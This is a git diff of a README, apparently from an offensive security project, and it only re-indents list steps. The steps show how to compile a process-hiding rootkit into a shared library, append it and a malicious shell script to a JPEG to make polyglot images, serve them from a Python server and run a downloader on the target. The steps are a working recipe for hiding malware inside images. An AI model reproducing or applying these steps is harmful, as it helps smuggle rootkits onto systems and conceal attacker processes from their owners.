@@ -55,15 +55,15 @@ jupyter lab --ip=0.0.0.0 --port=8888 --no-browser --allow-root
 3. Access remotely on kali, transfer `polygot_downloader.sh`.
 4. Set up a python server to serve the polygot images.
 5. Prepare the images:
-1. Compile the rootkit to `.so` file.
-```
-gcc -c -fPIC hideproc.c -o hideproc.o
-gcc hideproc.o -shared -o hideproc.so
-```
-2. Embed the script into the images.
-```
-cat panda.jpeg mal_shell > panda_v14
-cat panda.jpeg hideproc.so > panda_h14
-```
+  1. Compile the rootkit to `.so` file.
+  ```
+  gcc -c -fPIC hideproc.c -o hideproc.o
+  gcc hideproc.o -shared -o hideproc.so
+  ```
+  2. Embed the script into the images.
+  ```
+  cat panda.jpeg mal_shell > panda_v14
+  cat panda.jpeg hideproc.so > panda_h14
+  ```
 6. Execute the `polygot_downloader.sh`.
 
